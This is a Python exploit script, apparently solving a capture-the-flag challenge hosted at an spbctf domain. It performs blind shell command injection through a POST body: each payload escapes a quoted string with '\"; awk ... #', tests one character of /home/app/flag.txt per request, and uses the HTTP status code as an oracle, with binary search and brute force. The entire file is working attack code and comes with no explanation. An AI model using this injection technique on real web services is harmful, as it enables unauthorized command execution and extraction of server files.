#!/usr/bin/env python3
import string
import requests

RANGES = (string.ascii_lowercase, string.ascii_uppercase, string.digits, string.punctuation, string.whitespace)
URL = "https://its-godshell-gze55elc.spbctf.ru/question"
LINENUM = 2

def determine_range(i):
    for range in RANGES:
        payload = bytes(f"\"; awk 'BEGIN{{exitCode=1}} NR=={LINENUM}{{if(substr($0,{i},1) ~ /[{range[0]}-{range[-1]}]/) exitCode=0; exit exitCode}}' /home/app/flag.txt #", encoding="ascii")
        rsp = requests.post(URL, data=payload)
        if rsp.status_code == 200:
            return range
        
def binsearch(i, range):
    start, end = 0, len(range) - 1
    while start < end:
        mid = (start + end) // 2
        print(f"Trying binsearch: {start}, {mid}, {end}")
        payload = bytes(f"\"; awk 'BEGIN{{exitCode=1}} NR=={LINENUM}{{if(substr($0,{i},1) ~ /[{range[start]}-{range[mid]}]/) exitCode=0; exit exitCode}}' /home/app/flag.txt #", encoding="ascii")
        rsp = requests.post(URL, data=payload)
        if rsp.status_code == 200:
            end = mid
        else:
            start = mid + 1
    return range[start]

def bruteforce(i, range):
    for char in range:
        print(f"Trying bruteforce: {char}")
        if char in "'\"": # problematic AF
            continue
        payload = bytes(f"\"; awk 'BEGIN{{exitCode=1}} NR=={LINENUM}{{if(substr($0,{i},1) == \"{char}\") exitCode=0; exit exitCode}}' /home/app/flag.txt #", encoding="ascii")
        rsp = requests.post(URL, data=payload)
        if rsp.status_code == 200:
            return char
    return "?"

def main():
    flag = ""
    i = 1
    while True:
        range = determine_range(i)
        if range is None:
            print("Done")
            break
        print(f"Range for {i} is {range}")
        if range != string.punctuation:
            foundChar = binsearch(i, range)
        else:   # regex can be funny with special chars
            foundChar = bruteforce(i, range)
        flag += foundChar
        print(f"Found char for {i} is {foundChar}")
        i += 1
    print(f"Flag is {flag}")

if __name__ == "__main__":
    main()
